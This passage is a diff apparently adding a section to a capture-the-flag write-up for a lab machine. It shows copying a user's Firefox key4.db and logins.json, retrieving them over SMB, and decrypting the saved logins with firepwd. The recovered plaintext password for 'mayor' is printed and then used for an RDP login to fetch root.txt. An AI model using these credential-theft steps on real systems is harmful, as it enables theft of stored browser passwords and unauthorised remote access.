@@ -679,4 +679,140 @@ smb: \share\>
 
 ```
 
+# firefox creds
 
+
+was able to copy these two files
+
+
+````
+C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release>copy key4.db c:\users\share\.    
+copy key4.db c:\users\share\.                                                                                      
+        1 file(s) copied.                                                                                          
+                              
+                              
+                              
+C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release>copy logins.json c:\users\share\.
+copy logins.json c:\users\share\.
+        1 file(s) copied.
+
+
+```
+
+grab them via smb
+
+```
+└─$ smbclient --no-pass //10.10.137.168/Users                                                                      
+Try "help" to get a list of possible commands.                                                                     
+smb: \> cd share                                                                                                   
+smb: \share\> dir                                                                                                  
+  .                                   D        0  Mon Aug 22 00:29:51 2022                                         
+  ..                                  D        0  Mon Aug 22 00:29:51 2022                                         
+  gatekeeper.exe                      A    13312  Mon Apr 20 01:27:17 2020                                         
+  key4.db                             A   294912  Tue Apr 21 17:02:11 2020                                         
+                                                                                                                   
+                7863807 blocks of size 4096. 3878731 blocks available                                              
+smb: \share\> get key4.db                                                                                          
+getting file \share\key4.db of size 294912 as key4.db (265.4 KiloBytes/sec) (average 265.4 KiloBytes/sec)          
+smb: \share\> exit                       
+
+└─$ smbclient --no-pass //10.10.137.168/Users                                                                      
+Try "help" to get a list of possible commands.                                                                     
+smb: \> cd share                                                                                                   
+smb: \share\> dir                                                                                                  
+  .                                   D        0  Mon Aug 22 00:29:51 2022                                         
+  ..                                  D        0  Mon Aug 22 00:29:51 2022                                         
+  gatekeeper.exe                      A    13312  Mon Apr 20 01:27:17 2020                                         
+  key4.db                             A   294912  Tue Apr 21 17:02:11 2020                                         
+                                                                                                                   
+                7863807 blocks of size 4096. 3878425 blocks available                                              
+smb: \share\> dir                                                                                                  
+  .                                   D        0  Mon Aug 22 00:33:25 2022                                         
+  ..                                  D        0  Mon Aug 22 00:33:25 2022                                         
+  gatekeeper.exe                      A    13312  Mon Apr 20 01:27:17 2020                                         
+  key4.db                             A   294912  Tue Apr 21 17:02:11 2020                                         
+  logins.json                         A      600  Thu May 14 22:43:47 2020                                         
+g                                                                                                                  
+                7863807 blocks of size 4096. 3851018 blocks available                                              
+smb: \share\> get logins.json                                                                                      
+getting file \share\logins.json of size 600 as logins.json (1.0 KiloBytes/sec) (average 1.0 KiloBytes/sec)         
+smb: \share\> exit     
+```
+
+
+Which contain passwords for the mayor that I can crack with
+
+https://github.com/lclevy/firepwd
+
+```
+└─$ python firepwd/firepwd.py
+globalSalt: b'2d45b7ac4e42209a23235ecf825c018e0382291d'
+ SEQUENCE {
+   SEQUENCE {
+     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
+     SEQUENCE {
+       SEQUENCE {
+         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
+         SEQUENCE {
+           OCTETSTRING b'9e0554a19d22a773d0c5497efe7a80641fa25e2e73b2ddf3fbbca61d801c116d'
+           INTEGER b'01'
+           INTEGER b'20'
+           SEQUENCE {
+             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
+           }
+         }
+       }
+       SEQUENCE {
+         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
+         OCTETSTRING b'b0da1db2992a21a74e7946f23021'
+       }
+     }
+   }
+   OCTETSTRING b'a713739460522b20433f7d0b49bfabdb'
+ }
+clearText b'70617373776f72642d636865636b0202'
+password check? True
+ SEQUENCE {
+   SEQUENCE {
+     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
+     SEQUENCE {
+       SEQUENCE {
+         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
+         SEQUENCE {
+           OCTETSTRING b'f1f75a319f519506d39986e15fe90ade00280879f00ae1e036422f001afc6267'
+           INTEGER b'01'
+           INTEGER b'20'
+           SEQUENCE {
+             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
+           }
+         }
+       }
+       SEQUENCE {
+         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
+         OCTETSTRING b'dbd2424eabcf4be30180860055c8'
+       }
+     }
+   }
+   OCTETSTRING b'22daf82df08cfd8aa7692b00721f870688749d57b09cb1965dde5c353589dd5d'
+ }
+clearText b'86a15457f119f862f8296e4f2f6b97d9b6b6e9cb7a3204760808080808080808'
+decrypting login/password pairs
+   https://creds.com:b'mayor',b'8CL7O1N78MdrCIsV'
+
+
+```
+
+
+
+Then I can RDP with these creds.
+
+```
+xfreerdp /u:mayor /p:8CL7O1N78MdrCIsV /cert:ignore /v:10.10.137.168 /workarea
+
+```
+
+
+and get root.txt
+
+
+![image](https://user-images.githubusercontent.com/83407557/185841309-147a1953-0eaf-48e1-9e0b-fa4a4e2b7bac.png)
